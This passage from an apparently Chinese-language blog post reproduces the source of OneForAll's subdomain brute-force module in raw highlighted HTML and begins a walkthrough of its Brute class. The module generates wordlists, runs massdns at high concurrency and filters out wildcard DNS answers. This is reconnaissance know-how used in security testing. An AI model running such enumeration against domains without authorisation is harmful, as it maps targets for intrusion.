class="hljs-keyword">return</span><br>    sec = settings.check_time<br>    logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, <span class="hljs-string">f&#x27;You have <span class="hljs-subst">&#123;sec&#125;</span> seconds to check &#x27;</span><br>                        <span class="hljs-string">f&#x27;whether the configuration is correct or not&#x27;</span>)<br>    logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, <span class="hljs-string">f&#x27;If you want to exit, please use `Ctrl + C`&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        time.sleep(sec)<br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">&#x27;Due to configuration incorrect, exited&#x27;</span>)<br>        exit(<span class="hljs-number">0</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_result_infos</span>(<span class="hljs-params">items, infos, subdomains, appear_times, wc_ips, wc_ttl</span>):</span><br>    qname = items.get(<span class="hljs-string">&#x27;name&#x27;</span>)[:-<span class="hljs-number">1</span>]  <span class="hljs-comment"># 去除最右边的`.`点号</span><br>    reason = items.get(<span class="hljs-string">&#x27;status&#x27;</span>)<br>    resolver = items.get(<span class="hljs-string">&#x27;resolver&#x27;</span>)<br>    data = items.get(<span class="hljs-string">&#x27;data&#x27;</span>)<br>    answers = data.get(<span class="hljs-string">&#x27;answers&#x27;</span>)<br>    info = <span class="hljs-built_in">dict</span>()<br>    cnames = <span class="hljs-built_in">list</span>()<br>    ips = <span class="hljs-built_in">list</span>()<br>    ip_times = <span class="hljs-built_in">list</span>()<br>    cname_times = <span class="hljs-built_in">list</span>()<br>    ttls = <span class="hljs-built_in">list</span>()<br>    is_valid_flags = <span class="hljs-built_in">list</span>()<br>    have_a_record = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> answer <span class="hljs-keyword">in</span> answers:<br>        <span class="hljs-keyword">if</span> answer.get(<span class="hljs-string">&#x27;type&#x27;</span>) != <span class="hljs-string">&#x27;A&#x27;</span>:<br>            <span class="hljs-keyword">continue</span><br>        have_a_record = <span class="hljs-literal">True</span><br>        ttl = answer.get(<span class="hljs-string">&#x27;ttl&#x27;</span>)<br>        ttls.append(ttl)<br>        name = answer.get(<span class="hljs-string">&#x27;name&#x27;</span>)  <span class="hljs-comment"># 去除最右边的`.`点号</span><br>        cname = name[:-<span class="hljs-number">1</span>].lower()  <span class="hljs-comment"># 去除最右边的`.`点号</span><br>        cnames.append(cname)<br>        cname_num = appear_times.get(cname)<br>        cname_times.append(cname_num)<br>        ip = answer.get(<span class="hljs-string">&#x27;data&#x27;</span>)<br>        ips.append(ip)<br>        ip_num = appear_times.get(ip)<br>        ip_times.append(ip_num)<br>        isvalid, reason = wildcard.is_valid_subdomain(ip, ip_num, cname, cname_num, ttl, wc_ttl, wc_ips)<br>        logger.log(<span class="hljs-string">&#x27;TRACE&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;ip&#125;</span> effective: <span class="hljs-subst">&#123;isvalid&#125;</span> reason: <span class="hljs-subst">&#123;reason&#125;</span>&#x27;</span>)<br>        is_valid_flags.append(isvalid)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> have_a_record:<br>        logger.log(<span class="hljs-string">&#x27;TRACE&#x27;</span>, <span class="hljs-string">f&#x27;All query result of <span class="hljs-subst">&#123;qname&#125;</span> no A record<span class="hljs-subst">&#123;answers&#125;</span>&#x27;</span>)<br>    <span class="hljs-comment"># 为了优化内存 只添加有A记录且通过判断的子域到记录中</span><br>    <span class="hljs-keyword">if</span> have_a_record <span class="hljs-keyword">and</span> <span class="hljs-built_in">all</span>(is_valid_flags):<br>        info[<span class="hljs-string">&#x27;resolve&#x27;</span>] = <span class="hljs-number">1</span><br>        info[<span class="hljs-string">&#x27;reason&#x27;</span>] = reason<br>        info[<span class="hljs-string">&#x27;ttl&#x27;</span>] = ttls<br>        info[<span class="hljs-string">&#x27;cname&#x27;</span>] = cnames<br>        info[<span class="hljs-string">&#x27;ip&#x27;</span>] = ips<br>        info[<span class="hljs-string">&#x27;ip_times&#x27;</span>] = ip_times<br>        info[<span class="hljs-string">&#x27;cname_times&#x27;</span>] = cname_times<br>        info[<span class="hljs-string">&#x27;resolver&#x27;</span>] = resolver<br>        infos[qname] = info<br>        subdomains.append(qname)<br>    <span class="hljs-keyword">return</span> infos, subdomains<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">stat_appear_times</span>(<span class="hljs-params">result_path</span>):</span><br>    logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Counting IP cname appear times&#x27;</span>)<br>    times = <span class="hljs-built_in">dict</span>()<br>    logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;Reading <span class="hljs-subst">&#123;result_path&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(result_path) <span class="hljs-keyword">as</span> fd:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> fd:<br>            line = line.strip()<br>            <span class="hljs-keyword">try</span>:<br>                items = json.loads(line)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                logger.log(<span class="hljs-string">&#x27;ERROR&#x27;</span>, e.args)<br>                logger.log(<span class="hljs-string">&#x27;ERROR&#x27;</span>, <span class="hljs-string">f&#x27;Error parsing <span class="hljs-subst">&#123;result_path&#125;</span> &#x27;</span><br>                                    <span class="hljs-string">f&#x27;line <span class="hljs-subst">&#123;line&#125;</span> Skip this line&#x27;</span>)<br>                <span class="hljs-keyword">continue</span><br>            status = items.get(<span class="hljs-string">&#x27;status&#x27;</span>)<br>            <span class="hljs-keyword">if</span> status != <span class="hljs-string">&#x27;NOERROR&#x27;</span>:<br>                <span class="hljs-keyword">continue</span><br>            data = items.get(<span class="hljs-string">&#x27;data&#x27;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;answers&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:<br>                <span class="hljs-keyword">continue</span><br>            answers = data.get(<span class="hljs-string">&#x27;answers&#x27;</span>)<br>            <span class="hljs-keyword">for</span> answer <span class="hljs-keyword">in</span> answers:<br>                <span class="hljs-keyword">if</span> answer.get(<span class="hljs-string">&#x27;type&#x27;</span>) == <span class="hljs-string">&#x27;A&#x27;</span>:<br>                    ip = answer.get(<span class="hljs-string">&#x27;data&#x27;</span>)<br>                    <span class="hljs-comment"># 取值 如果是首次出现的IP集合 出现次数先赋值0</span><br>                    value_one = times.setdefault(ip, <span class="hljs-number">0</span>)<br>                    times[ip] = value_one + <span class="hljs-number">1</span><br>                    name = answer.get(<span class="hljs-string">&#x27;data&#x27;</span>)<br>                    cname = name[:-<span class="hljs-number">1</span>].lower()  <span class="hljs-comment"># 去除最右边的`.`点号</span><br>                    <span class="hljs-comment"># 取值 如果是首次出现的IP集合 出现次数先赋值0</span><br>                    value_two = times.setdefault(cname, <span class="hljs-number">0</span>)<br>                    times[cname] = value_two + <span class="hljs-number">1</span><br>                <span class="hljs-keyword">if</span> answer.get(<span class="hljs-string">&#x27;type&#x27;</span>) == <span class="hljs-string">&#x27;CNAME&#x27;</span>:<br>                    name = answer.get(<span class="hljs-string">&#x27;data&#x27;</span>)<br>                    cname = name[:-<span class="hljs-number">1</span>].lower()  <span class="hljs-comment"># 去除最右边的`.`点号</span><br>                    <span class="hljs-comment"># 取值 如果是首次出现的IP集合 出现次数先赋值0</span><br>                    value_three = times.setdefault(cname, <span class="hljs-number">0</span>)<br>                    times[cname] = value_three + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> times<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deal_output</span>(<span class="hljs-params">output_path, appear_times, wildcard_ips, wildcard_ttl</span>):</span><br>    logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Processing result&#x27;</span>)<br>    infos = <span class="hljs-built_in">dict</span>()  <span class="hljs-comment"># 用来记录所有域名有关信息</span><br>    subdomains = <span class="hljs-built_in">list</span>()  <span class="hljs-comment"># 用来保存所有通过有效性检查的子域</span><br>    logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;Processing <span class="hljs-subst">&#123;output_path&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_path) <span class="hljs-keyword">as</span> fd:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> fd:<br>            line = line.strip()<br>            <span class="hljs-keyword">try</span>:<br>                items = json.loads(line)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                logger.log(<span class="hljs-string">&#x27;ERROR&#x27;</span>, e.args)<br>                logger.log(<span class="hljs-string">&#x27;ERROR&#x27;</span>, <span class="hljs-string">f&#x27;Error parsing <span class="hljs-subst">&#123;line&#125;</span> Skip this line&#x27;</span>)<br>                <span class="hljs-keyword">continue</span><br>            qname = items.get(<span class="hljs-string">&#x27;name&#x27;</span>)[:-<span class="hljs-number">1</span>]  <span class="hljs-comment"># 去除最右边的`.`点号</span><br>            status = items.get(<span class="hljs-string">&#x27;status&#x27;</span>)<br>            <span class="hljs-keyword">if</span> status != <span class="hljs-string">&#x27;NOERROR&#x27;</span>:<br>                logger.log(<span class="hljs-string">&#x27;TRACE&#x27;</span>, <span class="hljs-string">f&#x27;Found <span class="hljs-subst">&#123;qname&#125;</span>\&#x27;s result <span class="hljs-subst">&#123;status&#125;</span> &#x27;</span><br>                                    <span class="hljs-string">f&#x27;while processing <span class="hljs-subst">&#123;line&#125;</span>&#x27;</span>)<br>                <span class="hljs-keyword">continue</span><br>            data = items.get(<span class="hljs-string">&#x27;data&#x27;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;answers&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:<br>                logger.log(<span class="hljs-string">&#x27;TRACE&#x27;</span>, <span class="hljs-string">f&#x27;Processing <span class="hljs-subst">&#123;line&#125;</span>, <span class="hljs-subst">&#123;qname&#125;</span> no response&#x27;</span>)<br>                <span class="hljs-keyword">continue</span><br>            infos, subdomains = gen_result_infos(items, infos, subdomains,<br>                                                 appear_times, wildcard_ips,<br>                                                 wildcard_ttl)<br>    <span class="hljs-keyword">return</span> infos, subdomains<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">save_brute_dict</span>(<span class="hljs-params">dict_path, dict_set</span>):</span><br>    dict_data = <span class="hljs-string">&#x27;\n&#x27;</span>.join(dict_set)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> utils.save_to_file(dict_path, dict_data):<br>        logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">&#x27;Saving dictionary error&#x27;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete_file</span>(<span class="hljs-params">dict_path, output_path</span>):</span><br>    <span class="hljs-keyword">if</span> settings.delete_generated_dict:<br>        dict_path.unlink()<br>    <span class="hljs-keyword">if</span> settings.delete_massdns_result:<br>        output_path.unlink()<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Brute</span>(<span class="hljs-params">Module</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    OneForAll subdomain brute module</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Example：</span><br><span class="hljs-string">        brute.py --target domain.com --word True run</span><br><span class="hljs-string">        brute.py --targets ./domains.txt --word True run</span><br><span class="hljs-string">        brute.py --target domain.com --word True --concurrent 2000 run</span><br><span class="hljs-string">        brute.py --target domain.com --word True --wordlist subnames.txt run</span><br><span class="hljs-string">        brute.py --target domain.com --word True --recursive True --depth 2 run</span><br><span class="hljs-string">        brute.py --target d.com --fuzz True --place m.*.d.com --rule &#x27;[a-z]&#x27; run</span><br><span class="hljs-string">        brute.py --target d.com --fuzz True --place m.*.d.com --fuzzlist subnames.txt run</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Note:</span><br><span class="hljs-string">        --fmt csv/json (result format)</span><br><span class="hljs-string">        --path   Result path (default None, automatically generated)</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">    :param str  target:     One domain (target or targets must be provided)</span><br><span class="hljs-string">    :param str  targets:    File path of one domain per line</span><br><span class="hljs-string">    :param int  concurrent: Number of concurrent (default 2000)</span><br><span class="hljs-string">    :param bool word:       Use word mode generate dictionary (default False)</span><br><span class="hljs-string">    :param str  wordlist:   Dictionary path used in word mode (default use ./config/default.py)</span><br><span class="hljs-string">    :param bool recursive:  Use recursion (default False)</span><br><span class="hljs-string">    :param int  depth:      Recursive depth (default 2)</span><br><span class="hljs-string">    :param str  nextlist:   Dictionary file path used by recursive (default use ./config/default.py)</span><br><span class="hljs-string">    :param bool fuzz:       Use fuzz mode generate dictionary (default False)</span><br><span class="hljs-string">    :param bool alive:      Only export alive subdomains (default False)</span><br><span class="hljs-string">    :param str  place:      Designated fuzz position (required if use fuzz mode)</span><br><span class="hljs-string">    :param str  rule:       Specify the regexp rules used in fuzz mode (required if use fuzz mode)</span><br><span class="hljs-string">    :param str  fuzzlist:   Dictionary path used in fuzz mode (default use ./config/default.py)</span><br><span class="hljs-string">    :param bool export:     Export the results (default True)</span><br><span class="hljs-string">    :param str  fmt:        Result format (default csv)</span><br><span class="hljs-string">    :param str  path:       Result directory (default None)</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, target=<span class="hljs-literal">None</span>, targets=<span class="hljs-literal">None</span>, concurrent=<span class="hljs-literal">None</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                 word=<span class="hljs-literal">False</span>, wordlist=<span class="hljs-literal">None</span>, recursive=<span class="hljs-literal">False</span>, depth=<span class="hljs-literal">None</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                 nextlist=<span class="hljs-literal">None</span>, fuzz=<span class="hljs-literal">False</span>, place=<span class="hljs-literal">None</span>, rule=<span class="hljs-literal">None</span>, fuzzlist=<span class="hljs-literal">None</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                 export=<span class="hljs-literal">True</span>, alive=<span class="hljs-literal">True</span>, fmt=<span class="hljs-string">&#x27;csv&#x27;</span>, path=<span class="hljs-literal">None</span></span>):</span><br>        Module.__init__(self)<br>        self.module = <span class="hljs-string">&#x27;Brute&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;Brute&#x27;</span><br>        self.target = target<br>        self.targets = targets<br>        self.concurrent_num = concurrent <span class="hljs-keyword">or</span> settings.brute_concurrent_num<br>        self.word = word<br>        self.wordlist = wordlist <span class="hljs-keyword">or</span> settings.brute_wordlist_path<br>        self.recursive_brute = recursive <span class="hljs-keyword">or</span> settings.enable_recursive_brute<br>        self.recursive_depth = depth <span class="hljs-keyword">or</span> settings.brute_recursive_depth<br>        self.recursive_nextlist = nextlist <span class="hljs-keyword">or</span> settings.recursive_nextlist_path<br>        self.fuzz = fuzz <span class="hljs-keyword">or</span> settings.enable_fuzz<br>        self.place = place <span class="hljs-keyword">or</span> settings.fuzz_place<br>        self.rule = rule <span class="hljs-keyword">or</span> settings.fuzz_rule<br>        self.fuzzlist = fuzzlist <span class="hljs-keyword">or</span> settings.fuzz_list<br>        self.export = export<br>        self.alive = alive<br>        self.fmt = fmt<br>        self.path = path<br>        self.bulk = <span class="hljs-literal">False</span>  <span class="hljs-comment"># 是否是批量爆破场景</span><br>        self.domains = <span class="hljs-built_in">list</span>()  <span class="hljs-comment"># 待爆破的所有域名集合</span><br>        self.domain = <span class="hljs-built_in">str</span>()  <span class="hljs-comment"># 当前正在进行爆破的域名</span><br>        self.ips_times = <span class="hljs-built_in">dict</span>()  <span class="hljs-comment"># IP集合出现次数</span><br>        self.enable_wildcard = <span class="hljs-literal">None</span>  <span class="hljs-comment"># 当前域名是否使用泛解析</span><br>        self.quite = <span class="hljs-literal">False</span><br>        self.in_china = <span class="hljs-literal">None</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_brute_dict</span>(<span class="hljs-params">self, domain</span>):</span><br>        logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Generating dictionary for <span class="hljs-subst">&#123;domain&#125;</span>&#x27;</span>)<br>        dict_set = <span class="hljs-built_in">set</span>()<br>        <span class="hljs-comment"># 如果domain不是self.subdomain 而是self.domain的子域则生成递归爆破字典</span><br>        <span class="hljs-keyword">if</span> self.word:<br>            self.place = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.place:<br>            self.place = <span class="hljs-string">&#x27;*.&#x27;</span> + domain<br>        wordlist = self.wordlist<br>        main_domain = utils.get_main_domain(domain)<br>        <span class="hljs-keyword">if</span> domain != main_domain:<br>            wordlist = self.recursive_nextlist<br>        <span class="hljs-keyword">if</span> self.word:<br>            word_subdomains = gen_word_subdomains(self.place, wordlist)<br>            dict_set.update(word_subdomains)<br>        <span class="hljs-keyword">if</span> self.fuzz:<br>            fuzz_subdomains = gen_fuzz_subdomains(self.place, self.rule, self.fuzzlist)<br>            dict_set.update(fuzz_subdomains)<br>        count = <span class="hljs-built_in">len</span>(dict_set)<br>        logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Dictionary size: <span class="hljs-subst">&#123;count&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">if</span> count &gt; <span class="hljs-number">10000000</span>:<br>            logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, <span class="hljs-string">f&#x27;The generated dictionary is &#x27;</span><br>                                <span class="hljs-string">f&#x27;too large <span class="hljs-subst">&#123;count&#125;</span> &gt; 10000000&#x27;</span>)<br>        <span class="hljs-keyword">return</span> dict_set<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_brute_params</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (self.word <span class="hljs-keyword">or</span> self.fuzz):<br>            logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">f&#x27;Please specify at least one brute mode&#x27;</span>)<br>            exit(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.domains) &gt; <span class="hljs-number">1</span>:<br>            self.bulk = <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">if</span> self.fuzz:<br>            <span class="hljs-keyword">if</span> self.place <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">f&#x27;No fuzz position specified&#x27;</span>)<br>                exit(<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> self.rule <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> self.fuzzlist <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">f&#x27;No fuzz rules or fuzz dictionary specified&#x27;</span>)<br>                exit(<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> self.bulk:<br>                logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">f&#x27;Cannot use fuzz mode in the bulk brute&#x27;</span>)<br>                exit(<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> self.recursive_brute:<br>                logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">f&#x27;Cannot use recursive brute in fuzz mode&#x27;</span>)<br>                exit(<span class="hljs-number">1</span>)<br>            fuzz_count = self.place.count(<span class="hljs-string">&#x27;*&#x27;</span>)<br>            <span class="hljs-keyword">if</span> fuzz_count &lt; <span class="hljs-number">1</span>:<br>                logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">f&#x27;No fuzz position specified&#x27;</span>)<br>                exit(<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> fuzz_count &gt; <span class="hljs-number">1</span>:<br>                logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">f&#x27;Only one fuzz position can be specified&#x27;</span>)<br>                exit(<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> self.domain <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.place:<br>                logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">f&#x27;Incorrect domain for fuzz&#x27;</span>)<br>                exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">init_dict_path</span>(<span class="hljs-params">self</span>):</span><br>        data_dir = settings.data_storage_dir<br>        <span class="hljs-keyword">if</span> self.wordlist <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            self.wordlist = settings.brute_wordlist_path <span class="hljs-keyword">or</span> data_dir.joinpath(<span class="hljs-string">&#x27;subnames.txt&#x27;</span>)<br>        <span class="hljs-keyword">if</span> self.recursive_nextlist <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            self.recursive_nextlist = settings.recursive_nextlist_path <span class="hljs-keyword">or</span> data_dir.joinpath(<span class="hljs-string">&#x27;subnames_next.txt&#x27;</span>)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">self, domain</span>):</span><br>        start = time.time()<br>        logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Blasting <span class="hljs-subst">&#123;domain&#125;</span> &#x27;</span>)<br>        massdns_dir = settings.third_party_dir.joinpath(<span class="hljs-string">&#x27;massdns&#x27;</span>)<br>        result_dir = settings.result_save_dir<br>        temp_dir = result_dir.joinpath(<span class="hljs-string">&#x27;temp&#x27;</span>)<br>        utils.check_dir(temp_dir)<br>        massdns_path = utils.get_massdns_path(massdns_dir)<br>        timestring = utils.get_timestring()<br><br>        wildcard_ips = <span class="hljs-built_in">list</span>()  <span class="hljs-comment"># 泛解析IP列表</span><br>        wildcard_ttl = <span class="hljs-built_in">int</span>()  <span class="hljs-comment"># 泛解析TTL整型值</span><br>        ns_list = query_domain_ns(self.domain)<br>        ns_ip_list = query_domain_ns_a(ns_list)  <span class="hljs-comment"># DNS权威名称服务器对应A记录列表</span><br>        <span class="hljs-keyword">if</span> self.enable_wildcard <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            self.enable_wildcard = wildcard.detect_wildcard(domain)<br><br>        <span class="hljs-keyword">if</span> self.enable_wildcard:<br>            wildcard_ips, wildcard_ttl = wildcard.collect_wildcard_record(domain, ns_ip_list)<br>        ns_path = utils.get_ns_path(self.in_china, self.enable_wildcard, ns_ip_list)<br><br>        dict_set = self.gen_brute_dict(domain)<br><br>        dict_name = <span class="hljs-string">f&#x27;generated_subdomains_<span class="hljs-subst">&#123;domain&#125;</span>_<span class="hljs-subst">&#123;timestring&#125;</span>.txt&#x27;</span><br>        dict_path = temp_dir.joinpath(dict_name)<br>        save_brute_dict(dict_path, dict_set)<br>        <span class="hljs-keyword">del</span> dict_set<br>        gc.collect()<br><br>        output_name = <span class="hljs-string">f&#x27;resolved_result_<span class="hljs-subst">&#123;domain&#125;</span>_<span class="hljs-subst">&#123;timestring&#125;</span>.json&#x27;</span><br>        output_path = temp_dir.joinpath(output_name)<br>        log_path = result_dir.joinpath(<span class="hljs-string">&#x27;massdns.log&#x27;</span>)<br>        check_dict()<br>        logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Running massdns to brute subdomains&#x27;</span>)<br>        utils.call_massdns(massdns_path, dict_path, ns_path, output_path,<br>                           log_path, quiet_mode=self.quite,<br>                           concurrent_num=self.concurrent_num)<br>        appear_times = stat_appear_times(output_path)<br>        self.infos, self.subdomains = deal_output(output_path, appear_times,<br>                                                  wildcard_ips, wildcard_ttl)<br>        delete_file(dict_path, output_path)<br>        end = time.time()<br>        self.elapse = <span class="hljs-built_in">round</span>(end - start, <span class="hljs-number">1</span>)<br>        logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.source&#125;</span> module takes <span class="hljs-subst">&#123;self.elapse&#125;</span> seconds, &#x27;</span><br>                            <span class="hljs-string">f&#x27;found <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(self.subdomains)&#125;</span> subdomains of <span class="hljs-subst">&#123;domain&#125;</span>&#x27;</span>)<br>        logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.source&#125;</span> module found subdomains of <span class="hljs-subst">&#123;domain&#125;</span>: &#x27;</span><br>                            <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.subdomains&#125;</span>&#x27;</span>)<br>        self.gen_result()<br>        self.save_db()<br>        <span class="hljs-keyword">return</span> self.subdomains<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self</span>):</span><br>        logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Start running <span class="hljs-subst">&#123;self.source&#125;</span> module&#x27;</span>)<br>        <span class="hljs-keyword">if</span> self.in_china <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            _, self.in_china = utils.get_net_env()<br>        self.domains = utils.get_domains(self.target, self.targets)<br>        <span class="hljs-keyword">for</span> self.domain <span class="hljs-keyword">in</span> self.domains:<br>            self.results = <span class="hljs-built_in">list</span>()  <span class="hljs-comment"># 置空</span><br>            all_subdomains = <span class="hljs-built_in">list</span>()<br>            self.init_dict_path()<br>            self.check_brute_params()<br>            <span class="hljs-keyword">if</span> self.recursive_brute:<br>                logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Start recursively brute the 1 layer subdomain&#x27;</span><br>                                    <span class="hljs-string">f&#x27; of <span class="hljs-subst">&#123;self.domain&#125;</span>&#x27;</span>)<br>            valid_subdomains = self.main(self.domain)<br><br>            all_subdomains.extend(valid_subdomains)<br><br>            <span class="hljs-comment"># 递归爆破下一层的子域</span><br>            <span class="hljs-comment"># fuzz模式不使用递归爆破</span><br>            <span class="hljs-keyword">if</span> self.recursive_brute:<br>                <span class="hljs-keyword">for</span> layer_num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, self.recursive_depth):<br>                    <span class="hljs-comment"># 之前已经做过1层子域爆破 当前实际递归层数是layer+1</span><br>                    logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Start recursively brute the <span class="hljs-subst">&#123;layer_num + <span class="hljs-number">1</span>&#125;</span> &#x27;</span><br>                                        <span class="hljs-string">f&#x27;layer subdomain of <span class="hljs-subst">&#123;self.domain&#125;</span>&#x27;</span>)<br>                    <span class="hljs-keyword">for</span> subdomain <span class="hljs-keyword">in</span> all_subdomains:<br>                        self.place = <span class="hljs-string">&#x27;*.&#x27;</span> + subdomain<br>                        <span class="hljs-comment"># 进行下一层子域爆破的限制条件</span><br>                        num = subdomain.count(<span class="hljs-string">&#x27;.&#x27;</span>) - self.domain.count(<span class="hljs-string">&#x27;.&#x27;</span>)<br>                        <span class="hljs-keyword">if</span> num == layer_num:<br>                            valid_subdomains = self.main(subdomain)<br>                            all_subdomains.extend(valid_subdomains)<br><br>            logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Finished <span class="hljs-subst">&#123;self.source&#125;</span> module to brute <span class="hljs-subst">&#123;self.domain&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.path:<br>                name = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.domain&#125;</span>_brute_result.<span class="hljs-subst">&#123;self.fmt&#125;</span>&#x27;</span><br>                self.path = settings.result_save_dir.joinpath(name)<br>            <span class="hljs-comment"># 数据库导出</span><br>            <span class="hljs-keyword">if</span> self.export:<br>                export.export_data(self.domain,<br>                                   alive=self.alive,<br>                                   limit=<span class="hljs-string">&#x27;resolve&#x27;</span>,<br>                                   path=self.path,<br>                                   fmt=self.fmt)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    fire.Fire(Brute)<br></code></pre></div></td></tr></table></figure><p>按照文件中的各个模块进行分析，首先分析class Brute</p><h1 id="1-Brute"><a href="#1-Brute" class="headerlink" title="1. Brute"></a>1. Brute</h1><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 